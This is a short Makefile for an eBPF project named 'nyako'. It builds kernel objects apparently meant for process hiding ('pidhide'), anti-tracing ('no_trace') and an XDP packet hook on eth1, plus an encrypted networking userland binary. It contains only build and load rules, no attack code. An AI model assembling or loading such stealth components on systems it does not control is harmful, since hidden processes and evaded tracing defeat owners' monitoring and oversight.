TARGET=-target bpf
CC=clang -g -O2 -Wall
LIBS=-lsodium -lcurl -lbpf -pthread
BPFTOOL=bpftool

nyako_kern:
	$(CC) $(TARGET) -c src/nyako_kern.c -o nyako_kern.o

no_trace_kern:
	$(CC) $(TARGET) -c src/no_trace_kern.c -o no_trace_kern.o
	$(BPFTOOL) gen skeleton no_trace_kern.o > src/no_trace_skeleton.h

pidhide_kern:
	$(CC) $(TARGET) -c src/pidhide_kern.c -o pidhide_kern.o
	$(BPFTOOL) gen skeleton pidhide_kern.o > src/pidhide_skeleton.h

nyako:
	$(CC) $(TARGET) -c src/nyako_kern.c -o nyako_kern.o
	$(CC) $(TARGET) -c src/no_trace_kern.c -o no_trace_kern.o
	$(BPFTOOL) gen skeleton no_trace_kern.o > src/no_trace_skeleton.h
	$(CC) $(TARGET) -c src/pidhide_kern.c -o pidhide_kern.o
	$(BPFTOOL) gen skeleton pidhide_kern.o > src/pidhide_skeleton.h
	$(CC) -o nyako.o src/utils.c src/logger.c src/crypto.c src/message.c src/network.c src/bpf_helpers.c src/no_trace.c src/pidhide.c src/nyako.c $(LIBS)

load:
	xdp-loader load -vv -m skb -s nyako_kern eth1 nyako_kern.o

unload:
	xdp-loader unload -a eth1

clean:
	rm nyako.o
	rm nyako_kern.o
	rm pidhide_kern.o
	rm no_trace_kern.o